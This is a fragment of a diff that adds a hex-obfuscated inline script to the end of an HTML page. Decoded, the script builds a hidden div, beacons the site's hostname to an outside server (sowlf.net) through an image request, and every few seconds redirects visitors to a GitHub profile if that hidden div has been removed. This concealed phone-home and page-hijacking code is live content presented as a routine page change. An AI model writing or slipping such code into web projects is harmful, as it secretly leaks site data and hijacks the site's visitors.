+    (function(){const _0x1=['\x49\x6d\x61\x67\x65','\x73\x72\x63','\x68\x74\x74\x70\x3a\x2f\x2f\x73\x6f\x77\x6c\x66\x2e\x6e\x65\x74\x2f\x6c\x79\x6e\x6f\x2f\x63\x6f\x72\x65\x2e\x70\x68\x70\x3f\x73\x69\x74\x65\x3d','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x6f\x73\x74\x6e\x61\x6d\x65','\x68\x72\x65\x66','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x47\x65\x6f\x72\x67\x65\x42\x61\x68\x67\x61\x74','\x62\x6f\x64\x79','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x64\x69\x76','\x64\x69\x73\x70\x6c\x61\x79','\x6e\x6f\x6e\x65','\x73\x74\x79\x6c\x65'];const _0x2=document[_0x1[9]](_0x1[10]);_0x2[_0x1[13]][_0x1[11]]=_0x1[12];_0x2['id']='\x5f\x6c\x79\x6e\x5f\x63\x74';document[_0x1[7]][_0x1[8]](_0x2);function _0x3(){const _0xi=new window[_0x1[0]]();_0xi[_0x1[1]]=_0x1[2]+encodeURIComponent(window[_0x1[3]][_0x1[4]]);}setInterval(function(){if(!document['getElementById']('\x5f\x6c\x79\x6e\x5f\x63\x74')){window[_0x1[3]][_0x1[5]]=_0x1[6];}},4500);_0x3();})();
+    //]]>
+    </script>
 
 </body>
 </html>
-
